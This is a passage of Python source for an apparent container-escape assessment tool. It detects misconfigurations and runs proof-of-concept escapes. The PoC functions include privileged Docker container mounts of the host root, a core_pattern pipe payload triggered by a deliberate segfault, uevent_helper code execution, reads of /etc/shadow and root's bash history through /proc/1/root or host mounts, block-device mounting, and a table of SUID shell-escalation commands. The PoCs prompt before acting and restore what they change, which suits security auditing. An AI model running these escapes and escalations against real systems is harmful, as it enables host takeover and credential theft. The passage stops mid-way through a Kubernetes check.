                    detail="Full Docker daemon control. Can create privileged containers "
                           "to access host filesystem, network, and processes.",
                    evidence=f"Path: {sock_path}, Writable: {writable}",
                    poc_available=True,
                    poc_description="Spawn privileged container to access host or read host files via docker",
                    poc_func=poc_docker_socket,
                    remediation="Never mount Docker socket into containers. Use Docker-in-Docker "
                                "or rootless Docker. Apply socket access controls.",
                ))
            elif readable:
                findings.append(Finding(
                    category="Docker Socket",
                    title=f"Docker socket readable: {sock_path}",
                    severity=Severity.HIGH,
                    detail="Docker socket is accessible. Even read access may allow "
                           "enumeration and some API calls.",
                    evidence=f"Path: {sock_path}, Read: {readable}, Write: {writable}",
                    poc_available=True,
                    poc_description="Enumerate Docker containers and images via API",
                    poc_func=poc_docker_socket_readonly,
                    remediation="Do not mount Docker socket into containers.",
                ))
            else:
                findings.append(Finding(
                    category="Docker Socket",
                    title=f"Docker socket exists but not accessible: {sock_path}",
                    severity=Severity.MEDIUM,
                    detail="Socket exists but current user cannot access it. "
                           "May be accessible after privilege escalation.",
                ))

        elif "containerd" in sock_path:
            findings.append(Finding(
                category="Docker Socket",
                title=f"containerd socket exposed: {sock_path}",
                severity=Severity.CRITICAL if writable else Severity.HIGH,
                detail="containerd socket access can be used to create/manage containers "
                       "bypassing Docker security controls.",
                evidence=f"Writable: {writable}",
                poc_available=writable,
                poc_description="Use ctr to interact with containerd directly",
                poc_func=poc_containerd_socket if writable else None,
                remediation="Do not expose containerd socket to containers.",
            ))

    return findings


def poc_docker_socket(ctx: AssessmentContext) -> bool:
    """PoC: Docker socket full access - demonstrate host access."""
    print(f"\n    {BOLD}PoC: Docker Socket Escape{RESET}")
    print(f"    {DIM}Demonstrating host access via Docker socket.{RESET}\n")

    sock = ctx.docker_sock_path or "/var/run/docker.sock"

    # Method 1: Docker CLI
    if ctx.has_docker_cli:
        print(f"    [Method 1: Docker CLI]")
        r = run_cmd("docker info --format '{{.OperatingSystem}}'")
        if r.rc == 0:
            print(f"    {GREEN}✓ Docker info: {r.out}{RESET}")

        # List containers
        r = run_cmd("docker ps --format '{{.ID}} {{.Image}} {{.Names}}'")
        if r.rc == 0 and r.out:
            print(f"    {GREEN}✓ Running containers:{RESET}")
            for line in r.out.splitlines()[:5]:
                print(f"      {line}")

        # Demonstrate host filesystem access
        print(f"\n    {YELLOW}Demonstrating host filesystem read via privileged container...{RESET}")
        marker = f"escape_test_{int(time.time())}"

        if prompt_user("Run a privileged container to read host /etc/hostname?"):
            r = run_cmd(f"docker run --rm --privileged -v /:/host alpine cat /host/etc/hostname")
            if r.rc == 0:
                print(f"    {RED}{BOLD}★ Host hostname: {r.out}{RESET}")
                print(f"    {RED}  Full host filesystem access confirmed!{RESET}")
                return True
            else:
                # Try with chroot approach
                r = run_cmd(f"docker run --rm -v /:/host alpine cat /host/etc/hostname")
                if r.rc == 0:
                    print(f"    {RED}{BOLD}★ Host hostname: {r.out}{RESET}")
                    return True
                print(f"    {YELLOW}⚠ Container creation failed: {r.err[:100]}{RESET}")

    # Method 2: Direct API via curl
    print(f"\n    [Method 2: Docker API via socket]")
    r = run_cmd(f"curl -s --unix-socket {sock} http://localhost/version")
    if r.rc == 0 and r.out:
        try:
            ver = json.loads(r.out)
            print(f"    {GREEN}✓ Docker API Version: {ver.get('Version', 'unknown')}{RESET}")
            print(f"    {GREEN}  OS: {ver.get('Os', '?')}, Arch: {ver.get('Arch', '?')}{RESET}")
        except json.JSONDecodeError:
            print(f"    {GREEN}✓ Got API response (non-JSON){RESET}")

        # List containers via API
        r = run_cmd(f"curl -s --unix-socket {sock} http://localhost/containers/json")
        if r.rc == 0 and r.out:
            try:
                containers = json.loads(r.out)
                print(f"    {GREEN}✓ {len(containers)} running containers visible{RESET}")
            except:
                pass

        print(f"\n    {RED}{BOLD}★ Docker API fully accessible - complete host compromise possible{RESET}")
        print(f"    {DIM}  Attack chain: create privileged container → mount host / → chroot → root shell{RESET}")
        return True

    print(f"    {RED}✗ Could not reach Docker API{RESET}")
    return False


def poc_docker_socket_readonly(ctx: AssessmentContext) -> bool:
    """PoC: Docker socket read-only enumeration."""
    print(f"\n    {BOLD}PoC: Docker Socket Enumeration{RESET}\n")

    sock = ctx.docker_sock_path or "/var/run/docker.sock"
    r = run_cmd(f"curl -s --unix-socket {sock} http://localhost/info")
    if r.rc == 0 and r.out:
        try:
            info = json.loads(r.out)
            print(f"    Docker Engine: {info.get('ServerVersion', '?')}")
            print(f"    Containers: {info.get('Containers', '?')} "
                  f"(Running: {info.get('ContainersRunning', '?')})")
            print(f"    Images: {info.get('Images', '?')}")
            print(f"    OS: {info.get('OperatingSystem', '?')}")
            print(f"    Kernel: {info.get('KernelVersion', '?')}")
            print(f"    {YELLOW}✓ Significant information disclosure{RESET}")
            return True
        except:
            pass

    return False


def poc_containerd_socket(ctx: AssessmentContext) -> bool:
    """PoC: containerd socket interaction."""
    print(f"\n    {BOLD}PoC: containerd Socket Access{RESET}\n")

    if shutil.which("ctr"):
        r = run_cmd("ctr --address /run/containerd/containerd.sock namespaces list")
        if r.rc == 0:
            print(f"    {GREEN}✓ containerd namespaces: {r.out}{RESET}")
            r = run_cmd("ctr --address /run/containerd/containerd.sock containers list")
            if r.rc == 0:
                print(f"    {GREEN}✓ Containers: {r.out[:200]}{RESET}")
            print(f"    {RED}★ containerd control achieved{RESET}")
            return True
    else:
        print(f"    {YELLOW}ctr not available, but socket is writable{RESET}")
        print(f"    {DIM}Install ctr or use gRPC directly to interact{RESET}")

    return False


# ═══════════════════════════════════════════════════════════════════════════════
# 4. PROCFS / SYSFS ABUSE
# ═══════════════════════════════════════════════════════════════════════════════

def check_procfs_sysfs(ctx: AssessmentContext) -> List[Finding]:
    """Check for dangerous procfs/sysfs paths."""
    findings = []

    # core_pattern
    core_pattern = read_file("/proc/sys/kernel/core_pattern")
    if core_pattern and not core_pattern.startswith("<"):
        # Check if writable
        try:
            with open("/proc/sys/kernel/core_pattern", "a"):
                pass
            writable = True
        except:
            writable = False

        if writable:
            findings.append(Finding(
                category="procfs/sysfs",
                title="core_pattern writable - host code execution possible",
                severity=Severity.CRITICAL,
                detail="Overwriting core_pattern with |/path/to/script allows executing "
                       "commands on the host when a process crashes.",
                evidence=f"Current: {core_pattern}",
                poc_available=True,
                poc_description="Write PoC to core_pattern and trigger crash for host execution",
                poc_func=poc_core_pattern,
                remediation="Mount /proc/sys read-only or use read-only rootfs.",
            ))

    # sysrq-trigger
    sysrq_path = "/proc/sysrq-trigger"
    if file_exists(sysrq_path):
        try:
            with open(sysrq_path, "a"):
                writable = True
        except:
            writable = False
        if writable:
            findings.append(Finding(
                category="procfs/sysfs",
                title="sysrq-trigger writable - kernel command injection",
                severity=Severity.HIGH,
                detail="Can send SysRq commands to kernel: reboot, crash, sync, etc.",
                remediation="Block access to /proc/sysrq-trigger.",
            ))

    # uevent_helper
    uevent_path = "/sys/kernel/uevent_helper"
    if file_exists(uevent_path):
        content = read_file(uevent_path)
        try:
            with open(uevent_path, "a"):
                writable = True
        except:
            writable = False
        if writable:
            findings.append(Finding(
                category="procfs/sysfs",
                title="uevent_helper writable - host code execution possible",
                severity=Severity.CRITICAL,
                detail="Writing a path to uevent_helper causes it to execute when a uevent fires. "
                       "Trigger with: echo change > /sys/class/mem/null/uevent",
                evidence=f"Current value: '{content}'",
                poc_available=True,
                poc_description="Write PoC command to uevent_helper and trigger uevent",
                poc_func=poc_uevent_helper,
                remediation="Mount /sys read-only or mask uevent_helper.",
            ))

    # /proc/self/root
    r = run_cmd("ls /proc/1/root/etc/hostname")
    if r.rc == 0:
        hostname = read_file("/proc/1/root/etc/hostname")
        findings.append(Finding(
            category="procfs/sysfs",
            title="/proc/1/root accessible - host filesystem readable",
            severity=Severity.CRITICAL,
            detail="Can browse host filesystem through /proc/1/root/ (PID 1 = init on host).",
            evidence=f"Host hostname: {hostname}",
            poc_available=True,
            poc_description="Browse host filesystem via /proc/1/root",
            poc_func=poc_proc_root,
        ))

    # /proc/keys and /proc/kallsyms
    keys = read_file("/proc/keys")
    if keys and not keys.startswith("<"):
        findings.append(Finding(
            category="procfs/sysfs",
            title="/proc/keys readable - kernel keyring exposed",
            severity=Severity.MEDIUM,
            detail="Kernel keyring contents may contain encryption keys or secrets.",
            evidence=keys[:200],
        ))

    kallsyms = read_file("/proc/kallsyms")
    if kallsyms and not kallsyms.startswith("<") and "0000000000000000" not in kallsyms[:100]:
        findings.append(Finding(
            category="procfs/sysfs",
            title="/proc/kallsyms readable with real addresses",
            severity=Severity.MEDIUM,
            detail="Kernel symbol addresses exposed. Useful for kernel exploit development.",
        ))

    # kcore
    if file_exists("/proc/kcore") and file_accessible("/proc/kcore"):
        findings.append(Finding(
            category="procfs/sysfs",
            title="/proc/kcore accessible - host physical memory readable",
            severity=Severity.CRITICAL,
            detail="Can read host kernel/physical memory. Credential extraction possible.",
            poc_available=True,
            poc_description="Read kcore header to confirm access",
            poc_func=poc_kcore,
        ))

    # kmem/mem
    for dev in ["/dev/kmem", "/dev/mem", "/dev/port"]:
        if file_exists(dev) and file_accessible(dev, os.R_OK):
            findings.append(Finding(
                category="procfs/sysfs",
                title=f"{dev} accessible - direct memory/port access",
                severity=Severity.CRITICAL,
                detail=f"Physical memory or port I/O access via {dev}.",
            ))

    return findings


def poc_core_pattern(ctx: AssessmentContext) -> bool:
    """PoC: core_pattern overwrite for host code execution."""
    print(f"\n    {BOLD}PoC: core_pattern Host Code Execution{RESET}")
    print(f"    {DIM}Overwrite core_pattern with a pipe command.{RESET}")
    print(f"    {DIM}When any process crashes, the command runs on the host.{RESET}\n")

    original = read_file("/proc/sys/kernel/core_pattern")
    marker = f"/tmp/core_escape_poc_{int(time.time())}"

    # Build payload
    # We use a benign marker touch + capture of host info
    payload = f"|/bin/sh -c 'touch {marker} && id > {marker}.info && hostname >> {marker}.info'"

    print(f"    Original core_pattern: {original}")
    print(f"    Proposed payload: {payload}")

    if not prompt_user("Write PoC core_pattern and trigger crash?"):
        return False

    prefix = "sudo -n " if not ctx.is_root and ctx.sudo_passwordless else ""

    # Write core_pattern
    r = run_cmd(f"{prefix}sh -c 'echo \"{payload}\" > /proc/sys/kernel/core_pattern'", shell=True)
    if r.rc != 0:
        print(f"    {RED}✗ Cannot write core_pattern: {r.err}{RESET}")
        return False

    verify = read_file("/proc/sys/kernel/core_pattern")
    print(f"    {GREEN}✓ core_pattern set to: {verify}{RESET}")

    # Trigger: compile and crash a small program
    print(f"    Triggering crash...")
    crash_c = """
#include <stdio.h>
int main() { char *p = 0; *p = 42; return 0; }
"""
    with tempfile.NamedTemporaryFile(suffix=".c", mode="w", delete=False) as f:
        f.write(crash_c)
        c_path = f.name

    out_path = c_path.replace(".c", "")
    r = run_cmd(f"gcc -o {out_path} {c_path}")
    if r.rc != 0:
        print(f"    {YELLOW}⚠ gcc not available to compile crash trigger{RESET}")
        # Restore
        run_cmd(f"{prefix}sh -c 'echo \"{original}\" > /proc/sys/kernel/core_pattern'", shell=True)
        os.unlink(c_path)
        return False

    # Run the crash binary (will segfault)
    os.system(f"ulimit -c unlimited; {out_path} 2>/dev/null")
    time.sleep(2)

    # Restore original
    run_cmd(f"{prefix}sh -c 'echo \"{original}\" > /proc/sys/kernel/core_pattern'", shell=True)

    # Check marker
    if file_exists(marker):
        info = read_file(f"{marker}.info")
        print(f"\n    {RED}{BOLD}★ SUCCESS - Code executed on host via core_pattern!{RESET}")
        if info:
            print(f"    {RED}  Host info: {info}{RESET}")
        run_cmd(f"{prefix}rm -f {marker} {marker}.info")
        os.unlink(c_path)
        os.unlink(out_path)
        return True
    else:
        print(f"    {YELLOW}⚠ core_pattern written but trigger may not have reached host{RESET}")
        os.unlink(c_path)
        if file_exists(out_path):
            os.unlink(out_path)
        return False


def poc_uevent_helper(ctx: AssessmentContext) -> bool:
    """PoC: uevent_helper overwrite for host code execution."""
    print(f"\n    {BOLD}PoC: uevent_helper Host Code Execution{RESET}\n")

    marker = f"/tmp/uevent_escape_poc_{int(time.time())}"
    prefix = "sudo -n " if not ctx.is_root and ctx.sudo_passwordless else ""

    # Save original
    original = read_file("/sys/kernel/uevent_helper")

    # Create script
    script_path = "/tmp/uevent_poc.sh"
    script_content = f"#!/bin/sh\ntouch {marker}\nid > {marker}.info\nhostname >> {marker}.info\n"

    with open(script_path, "w") as f:
        f.write(script_content)
    os.chmod(script_path, 0o755)

    # Write uevent_helper
    r = run_cmd(f"{prefix}sh -c 'echo {script_path} > /sys/kernel/uevent_helper'", shell=True)
    if r.rc != 0:
        print(f"    {RED}✗ Cannot write uevent_helper: {r.err}{RESET}")
        return False

    print(f"    {GREEN}✓ uevent_helper set to: {script_path}{RESET}")

    # Trigger uevent
    print(f"    Triggering uevent...")
    r = run_cmd(f"{prefix}sh -c 'echo change > /sys/class/mem/null/uevent'", shell=True)
    time.sleep(2)

    # Restore
    run_cmd(f"{prefix}sh -c 'echo \"{original}\" > /sys/kernel/uevent_helper'", shell=True)

    if file_exists(marker):
        info = read_file(f"{marker}.info")
        print(f"\n    {RED}{BOLD}★ SUCCESS - Code executed on host via uevent_helper!{RESET}")
        if info:
            print(f"    {RED}  Host info: {info}{RESET}")
        run_cmd(f"rm -f {marker} {marker}.info {script_path}")
        return True
    else:
        print(f"    {YELLOW}⚠ uevent_helper written but trigger may not have fired{RESET}")
        return False


def poc_proc_root(ctx: AssessmentContext) -> bool:
    """PoC: Browse host filesystem via /proc/1/root."""
    print(f"\n    {BOLD}PoC: Host Filesystem via /proc/1/root{RESET}\n")

    paths_to_read = [
        ("/proc/1/root/etc/hostname", "Hostname"),
        ("/proc/1/root/etc/os-release", "OS Release"),
        ("/proc/1/root/etc/shadow", "Shadow file"),
        ("/proc/1/root/root/.bash_history", "Root bash history"),
    ]

    found_any = False
    for path, label in paths_to_read:
        content = read_file(path)
        if content and not content.startswith("<"):
            print(f"    {RED}★ {label}: {content[:200]}{RESET}")
            found_any = True
        else:
            print(f"    ✗ {label}: not readable")

    return found_any


def poc_kcore(ctx: AssessmentContext) -> bool:
    """PoC: Read /proc/kcore header."""
    print(f"\n    {BOLD}PoC: /proc/kcore Access{RESET}\n")
    try:
        with open("/proc/kcore", "rb") as f:
            header = f.read(64)
            if header[:4] == b"\x7fELF":
                print(f"    {RED}{BOLD}★ /proc/kcore is readable - valid ELF core dump{RESET}")
                print(f"    {RED}  Host kernel memory can be read and searched for credentials{RESET}")
                return True
    except Exception as e:
        print(f"    {YELLOW}⚠ Cannot read kcore: {e}{RESET}")
    return False


# ═══════════════════════════════════════════════════════════════════════════════
# 5. NAMESPACE ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════════

def check_namespaces(ctx: AssessmentContext) -> List[Finding]:
    """Analyze namespace isolation."""
    findings = []
    ns_types = ["mnt", "pid", "net", "user", "uts", "ipc", "cgroup"]

    # Get container and init namespace IDs
    container_ns = {}
    init_ns = {}

    for ns in ns_types:
        r = run_cmd(f"readlink /proc/self/ns/{ns}")
        container_ns[ns] = r.out if r.rc == 0 else ""
        r = run_cmd(f"readlink /proc/1/ns/{ns}")
        init_ns[ns] = r.out if r.rc == 0 else ""

    shared_ns = []
    for ns in ns_types:
        if container_ns.get(ns) and init_ns.get(ns) and container_ns[ns] == init_ns[ns]:
            shared_ns.append(ns)

    # PID namespace sharing
    if "pid" in shared_ns:
        findings.append(Finding(
            category="Namespaces",
            title="PID namespace shared with host",
            severity=Severity.HIGH,
            detail="Container shares PID namespace with host. All host processes visible. "
                   "Process injection possible with CAP_SYS_PTRACE.",
            evidence=f"Container PID ns: {container_ns.get('pid', '?')}",
            poc_available=True,
            poc_description="List host processes and identify injection targets",
            poc_func=poc_shared_pid_ns,
        ))

    # Network namespace sharing
    if "net" in shared_ns:
        findings.append(Finding(
            category="Namespaces",
            title="Network namespace shared with host",
            severity=Severity.HIGH,
            detail="Container shares network namespace. Can see all host interfaces, "
                   "sniff traffic, and access services on localhost.",
            poc_available=True,
            poc_description="Show host network interfaces and listening services",
            poc_func=poc_shared_net_ns,
        ))

    # Mount namespace (if somehow shared)
    if "mnt" in shared_ns:
        findings.append(Finding(
            category="Namespaces",
            title="Mount namespace shared with host",
            severity=Severity.CRITICAL,
            detail="Container shares mount namespace. Full host filesystem is accessible.",
        ))

    # IPC namespace
    if "ipc" in shared_ns:
        findings.append(Finding(
            category="Namespaces",
            title="IPC namespace shared with host",
            severity=Severity.MEDIUM,
            detail="Container shares IPC namespace. Can interact with host shared memory segments.",
        ))

    # UTS namespace
    if "uts" in shared_ns:
        findings.append(Finding(
            category="Namespaces",
            title="UTS namespace shared with host",
            severity=Severity.LOW,
            detail="Container shares UTS namespace. Can see/change host hostname.",
        ))

    # User namespace
    if not ctx.userns_active:
        findings.append(Finding(
            category="Namespaces",
            title="No user namespace remapping detected",
            severity=Severity.MEDIUM,
            detail="Container root (UID 0) maps directly to host root. "
                   "Escape vulnerabilities will grant host root access.",
            evidence=f"uid_map: {ctx.uid_map_text.strip()}",
            remediation="Enable user namespace remapping (userns-remap) in Docker daemon.",
        ))

    if not shared_ns:
        findings.append(Finding(
            category="Namespaces",
            title="All namespaces appear properly isolated",
            severity=Severity.INFO,
            detail="Container uses separate namespaces for all checked types.",
        ))

    return findings


def poc_shared_pid_ns(ctx: AssessmentContext) -> bool:
    """PoC: Enumerate host processes when PID namespace is shared."""
    print(f"\n    {BOLD}PoC: Shared PID Namespace - Host Process Enumeration{RESET}\n")

    r = run_cmd("ps auxf 2>/dev/null || ps aux", shell=True)
    if r.rc == 0:
        lines = r.out.splitlines()
        print(f"    {RED}★ {len(lines)} processes visible (including host):{RESET}")
        # Show interesting ones
        for line in lines:
            lower = line.lower()
            if any(kw in lower for kw in ["dockerd", "containerd", "kubelet", "systemd",
                                           "sshd", "postgres", "mysql", "nginx", "apache"]):
                print(f"    {RED}  {line[:120]}{RESET}")
        return True
    return False


def poc_shared_net_ns(ctx: AssessmentContext) -> bool:
    """PoC: Show host network info when network namespace is shared."""
    print(f"\n    {BOLD}PoC: Shared Network Namespace - Host Network Exposure{RESET}\n")

    # Show interfaces
    r = run_cmd("ip addr show 2>/dev/null || ifconfig", shell=True)
    if r.rc == 0:
        print(f"    {GREEN}✓ Network interfaces:{RESET}")
        print(f"    {DIM}{r.out[:500]}{RESET}")

    # Show listening ports
    r = run_cmd("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null", shell=True)
    if r.rc == 0:
        print(f"\n    {RED}★ Host listening services:{RESET}")
        for line in r.out.splitlines()[:20]:
            print(f"    {line}")
        return True

    return False


# ═══════════════════════════════════════════════════════════════════════════════
# 6. HOST MOUNT DETECTION
# ═══════════════════════════════════════════════════════════════════════════════

def check_host_mounts(ctx: AssessmentContext) -> List[Finding]:
    """Detect sensitive host filesystem mounts."""
    findings = []
    mounts = ctx.mounts_text

    # Parse mountinfo for host mounts
    dangerous_mounts = []
    for line in mounts.splitlines():
        parts = line.split()
        if len(parts) < 5:
            continue

        mount_point = parts[4] if len(parts) > 4 else parts[1]

        # Check for root mount
        if mount_point == "/" and "overlay" not in line.lower() and "aufs" not in line.lower():
            # Might be host root
            pass

        # Check for host sensitive path mounts
        for sensitive in ["/etc", "/var", "/root", "/home", "/opt",
                          "/var/run/docker.sock", "/var/lib/docker",
                          "/var/lib/kubelet"]:
            if sensitive in line:
                # Verify it's actually a bind mount from host
                if "bind" in line or any(fs in line for fs in ["ext4", "xfs", "btrfs", "zfs"]):
                    dangerous_mounts.append((mount_point, line.strip()[:150]))

    # Check for direct host paths
    host_paths_found = []
    for path in ["/host", "/host-root", "/rootfs", "/hostfs"]:
        if file_exists(path):
            content = run_cmd(f"ls {path}")
            if content.rc == 0 and any(d in content.out for d in ["etc", "var", "usr", "bin"]):
                host_paths_found.append(path)

    if host_paths_found:
        findings.append(Finding(
            category="Host Mounts",
            title=f"Host filesystem mounted: {', '.join(host_paths_found)}",
            severity=Severity.CRITICAL,
            detail="Host root filesystem is directly mounted into the container.",
            poc_available=True,
            poc_description="Read host sensitive files from mounted filesystem",
            poc_func=lambda ctx: poc_host_mount_read(ctx, host_paths_found[0]),
        ))

    # Check for sensitive individual mounts
    for path in SENSITIVE_HOST_MOUNTS:
        if file_exists(path) and file_accessible(path, os.R_OK):
            content = read_file(path)
            if content and not content.startswith("<"):
                findings.append(Finding(
                    category="Host Mounts",
                    title=f"Sensitive host file accessible: {path}",
                    severity=Severity.HIGH if "shadow" in path or "ssh" in path else Severity.MEDIUM,
                    detail=f"Host file {path} is readable inside the container.",
                    evidence=content[:100] if "shadow" not in path else "[content hidden]",
                ))

    # Check for device mounts
    for dev in glob.glob("/dev/sd*") + glob.glob("/dev/vd*") + glob.glob("/dev/xvd*") + \
               glob.glob("/dev/nvme*"):
        if file_accessible(dev, os.R_OK):
            findings.append(Finding(
                category="Host Mounts",
                title=f"Block device accessible: {dev}",
                severity=Severity.CRITICAL,
                detail=f"Can read host disk {dev}. May be able to mount and read host filesystem.",
                poc_available=True,
                poc_description=f"Attempt to mount {dev} and read host files",
                poc_func=lambda ctx, d=dev: poc_mount_device(ctx, d),
                remediation="Do not pass host block devices to containers.",
            ))

    return findings


def poc_host_mount_read(ctx: AssessmentContext, mount_path: str) -> bool:
    """PoC: Read host files from mounted filesystem."""
    print(f"\n    {BOLD}PoC: Host Filesystem Read via {mount_path}{RESET}\n")

    targets = [
        f"{mount_path}/etc/hostname",
        f"{mount_path}/etc/shadow",
        f"{mount_path}/etc/passwd",
        f"{mount_path}/root/.ssh/authorized_keys",
        f"{mount_path}/root/.bash_history",
    ]

    found = False
    for t in targets:
        content = read_file(t)
        if content and not content.startswith("<"):
            label = t.replace(mount_path, "")
            print(f"    {RED}★ {label}: {content[:150]}{RESET}")
            found = True

    if found:
        print(f"\n    {RED}{BOLD}★ Host filesystem fully readable!{RESET}")

        if prompt_user("Attempt to write a proof marker to host filesystem?"):
            marker = f"{mount_path}/tmp/container_escape_marker_{int(time.time())}"
            try:
                with open(marker, "w") as f:
                    f.write(f"Container escape PoC - {datetime.now().isoformat()}\n")
                print(f"    {RED}{BOLD}★ WRITE CONFIRMED: {marker}{RESET}")
                os.unlink(marker)
                return True
            except Exception as e:
                print(f"    {YELLOW}⚠ Write failed: {e}{RESET}")

    return found


def poc_mount_device(ctx: AssessmentContext, device: str) -> bool:
    """PoC: Mount host block device and read files."""
    print(f"\n    {BOLD}PoC: Mount Host Device {device}{RESET}\n")

    prefix = "sudo -n " if not ctx.is_root and ctx.sudo_passwordless else ""
    if not ctx.is_root and not ctx.sudo_passwordless:
        print(f"    {RED}✗ Need root to mount devices{RESET}")
        return False

    mount_point = f"/tmp/host_disk_{int(time.time())}"
    run_cmd(f"{prefix}mkdir -p {mount_point}")

    r = run_cmd(f"{prefix}mount -o ro {device} {mount_point}")
    if r.rc == 0:
        hostname = read_file(f"{mount_point}/etc/hostname")
        print(f"    {RED}{BOLD}★ Device mounted successfully!{RESET}")
        if hostname:
            print(f"    {RED}  Host hostname: {hostname}{RESET}")

        # List some files
        r2 = run_cmd(f"ls {mount_point}/etc/")
        if r2.rc == 0:
            print(f"    {RED}  /etc contents: {r2.out[:200]}{RESET}")

        # Unmount
        run_cmd(f"{prefix}umount {mount_point}")
        run_cmd(f"{prefix}rmdir {mount_point}")
        return True
    else:
        print(f"    {YELLOW}⚠ Mount failed: {r.err}{RESET}")
        run_cmd(f"{prefix}rmdir {mount_point}")
        return False


# ═══════════════════════════════════════════════════════════════════════════════
# 7. SECURITY PROFILE ANALYSIS (AppArmor, SELinux, Seccomp)
# ═══════════════════════════════════════════════════════════════════════════════

def check_security_profiles(ctx: AssessmentContext) -> List[Finding]:
    """Check AppArmor, SELinux, and Seccomp status."""
    findings = []

    # Seccomp
    if ctx.seccomp_mode == 0:
        findings.append(Finding(
            category="Security Profiles",
            title="Seccomp DISABLED (mode 0)",
            severity=Severity.HIGH,
            detail="No syscall filtering. All syscalls available including dangerous ones "
                   "(mount, ptrace, clone with CLONE_NEWUSER, etc.)",
            remediation="Apply a seccomp profile. Use Docker's default or a custom restrictive profile.",
        ))
    elif ctx.seccomp_mode == 1:
        findings.append(Finding(
            category="Security Profiles",
            title="Seccomp strict mode (mode 1)",
            severity=Severity.INFO,
            detail="Only read, write, exit, sigreturn allowed. Very restrictive.",
        ))
    elif ctx.seccomp_mode == 2:
        findings.append(Finding(
            category="Security Profiles",
            title="Seccomp filter mode (mode 2)",
            severity=Severity.INFO,
            detail="Seccomp BPF filter active. Specific syscalls may still be dangerous "
                   "depending on the profile.",
        ))

    # AppArmor
    if ctx.apparmor_profile:
        if "unconfined" in ctx.apparmor_profile.lower():
            findings.append(Finding(
                category="Security Profiles",
                title="AppArmor profile: unconfined",
                severity=Severity.MEDIUM,
                detail="No AppArmor confinement. Container can perform actions "
                       "unrestricted by mandatory access control.",
                remediation="Apply a restrictive AppArmor profile.",
            ))
        elif "docker-default" in ctx.apparmor_profile.lower():
            findings.append(Finding(
                category="Security Profiles",
                title=f"AppArmor profile: {ctx.apparmor_profile}",
                severity=Severity.INFO,
                detail="Docker default AppArmor profile applied.",
            ))
        else:
            findings.append(Finding(
                category="Security Profiles",
                title=f"AppArmor profile: {ctx.apparmor_profile}",
                severity=Severity.INFO,
                detail="Custom AppArmor profile active.",
            ))
    else:
        findings.append(Finding(
            category="Security Profiles",
            title="No AppArmor profile detected",
            severity=Severity.MEDIUM,
            detail="AppArmor does not appear to be confining this container.",
            remediation="Enable AppArmor profiles for containers.",
        ))

    # SELinux
    if ctx.selinux_mode:
        if ctx.selinux_mode.lower() in ("disabled", "permissive"):
            findings.append(Finding(
                category="Security Profiles",
                title=f"SELinux: {ctx.selinux_mode}",
                severity=Severity.MEDIUM if ctx.selinux_mode.lower() == "permissive" else Severity.HIGH,
                detail=f"SELinux is {ctx.selinux_mode}. Not enforcing mandatory access control.",
            ))

    # NoNewPrivs
    status = read_file("/proc/self/status")
    nnp_match = re.search(r"^NoNewPrivs:\s*(\d+)\s*$", status, flags=re.M)
    if nnp_match and nnp_match.group(1) == "0":
        findings.append(Finding(
            category="Security Profiles",
            title="NoNewPrivs not set",
            severity=Severity.LOW,
            detail="Processes can gain new privileges via setuid binaries or file capabilities.",
            remediation="Set no-new-privileges security option.",
        ))

    # Check for SUID/SGID binaries
    r = run_cmd("find / -perm -4000 -type f 2>/dev/null | head -20", shell=True, timeout=15)
    if r.rc == 0 and r.out:
        suid_bins = r.out.splitlines()
        interesting_suid = [b for b in suid_bins if any(
            kw in b for kw in ["python", "perl", "ruby", "bash", "sh", "env",
                                "nmap", "vim", "find", "awk", "cp", "mv",
                                "docker", "mount", "su", "passwd"]
        )]
        if interesting_suid:
            findings.append(Finding(
                category="Security Profiles",
                title=f"Exploitable SUID binaries found ({len(interesting_suid)})",
                severity=Severity.HIGH,
                detail="SUID binaries that may allow privilege escalation within the container.",
                evidence="\n".join(interesting_suid[:10]),
                poc_available=True,
                poc_description="Attempt privilege escalation via SUID binary",
                poc_func=poc_suid_escalation,
            ))

    return findings


def poc_suid_escalation(ctx: AssessmentContext) -> bool:
    """PoC: Check if any SUID binary can be used for escalation."""
    print(f"\n    {BOLD}PoC: SUID Binary Privilege Escalation{RESET}\n")

    r = run_cmd("find / -perm -4000 -type f 2>/dev/null", shell=True, timeout=15)
    if r.rc != 0 or not r.out:
        print(f"    {YELLOW}⚠ No SUID binaries found{RESET}")
        return False

    suid_bins = r.out.splitlines()
    print(f"    Found {len(suid_bins)} SUID binaries:")

    # GTFOBins-style checks
    escalation_methods = {
        "python": "{bin} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
        "perl": "{bin} -e 'exec \"/bin/sh\";'",
        "bash": "{bin} -p",
        "env": "{bin} /bin/sh -p",
        "find": "{bin} . -exec /bin/sh -p \\;",
        "nmap": "{bin} --interactive  # then !sh",
        "vim": "{bin} -c ':!/bin/sh'",
        "cp": "Can overwrite /etc/shadow or /etc/passwd",
        "mount": "Can mount host devices or filesystems",
        "docker": "Docker SUID = full host access via privileged container",
    }

    found_escalation = False
    for binary in suid_bins:
        base = os.path.basename(binary)
        for name, method in escalation_methods.items():
            if name in base:
                print(f"    {RED}★ {binary} → {method.format(bin=binary)}{RESET}")
                found_escalation = True

    return found_escalation


# ═══════════════════════════════════════════════════════════════════════════════
# 8. KUBERNETES CHECKS
# ═══════════════════════════════════════════════════════════════════════════════

def check_kubernetes(ctx: AssessmentContext) -> List[Finding]:
    """Check Kubernetes-specific escape vectors."""
    findings = []

    if not ctx.k8s_in_cluster:
        return findings

    findings.append(Finding(
        category="Kubernetes",
        title="Kubernetes cluster environment detected",
        severity=Severity.INFO,
        detail=f"KUBERNETES_SERVICE_HOST={os.environ.get('KUBERNETES_SERVICE_HOST', 'N/A')}",
    ))

    # Service account token
    sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    sa_ca_path = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    sa_ns_path = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"

    if file_exists(sa_token_path) and file_accessible(sa_token_path):
        token = read_file(sa_token_path)
        namespace = read_file(sa_ns_path) or "default"

        findings.append(Finding(
            category="Kubernetes",
            title="Service account token accessible",
            severity=Severity.HIGH,
            detail=f"Namespace: {namespace}. Token can be used to authenticate to Kubernetes API. "
                   "Permissions depend on RBAC configuration.",
            evidence=f"Token (first 50 chars): {token[:50]}...",
            poc_available=True,
            poc_description="Query Kubernetes API with service account token",
            poc_func=poc_k8s_api,
            remediation="Use automountServiceAccountToken: false unless token is needed.",
        ))

    # Check for kubelet API access
    kubelet_ports = [10250, 10255]
    for port in kubelet_ports:
        if tcp_connect("127.0.0.1", port, timeout=1.5):
            findings.append(Finding(
                category="Kubernetes",
                title=f"Kubelet API accessible on port {port}",
